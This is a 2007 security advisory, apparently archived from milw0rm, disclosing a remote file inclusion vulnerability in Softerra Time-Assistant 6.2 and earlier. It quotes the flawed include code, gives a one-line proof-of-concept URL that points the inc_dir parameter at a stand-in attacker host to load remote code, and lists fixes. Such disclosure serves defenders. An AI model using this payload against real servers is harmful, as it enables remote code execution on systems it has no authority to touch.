@@ -1,0 +1,95 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_80$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_80$2007] Softerra Time-Assistant <= 6.2 (inc_dir) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : March, 29th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv80-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Time-Assistant  
+version       : <= 6.2 Time-Assistant Standard, Time-Assistant Enterprise, Time-Assistant light
+Vendor        : http://www.time-assistant.com
+Description :
+
+Time-Assistant - Web based time tracking software for Internet/Intranet featuring employee timesheets and various reports and project management tools that include salary calculation, invoices and expenses, online services and PDA package. Time-Assistant is professional timesheet software for your business. It is a daily time tracking solution designed to reduce the drudgery of recording, analyzing and reporting associated with everyday working routine. With Time-Assistant you can easily manage employee timesheets and expenses, calculate salaries, prepare project estimates, get invoices based on personal or client work rates.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+- Invalid include function at lib/timesheet.class.php :  
+  	
+----------------lib/timesheet.class.php-------------------
+...
+include ($inc_dir . "database.inc.php");
+include ($lib_dir . "sqlstorage.class.php");
+include ($lib_dir . "lib.php");
+include ($lib_dir . "timesheet.lib.php");
+...
+----------------------------------------------------------------
+
+
+Input passed to the "inc_dir" and "lib_dir" parameter in lib/timesheet.class.php is not properly verified before being used to include files. 
+This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[Time-Assistant_path]/lib/timesheet.class.php?inc_dir=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals
+
+
+Notification:
+~~~~~~
+- 28-03-2007 bugs found
+- 28-03-2007 vendor contacted but no response
+- 29-03-2007 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-03-29]
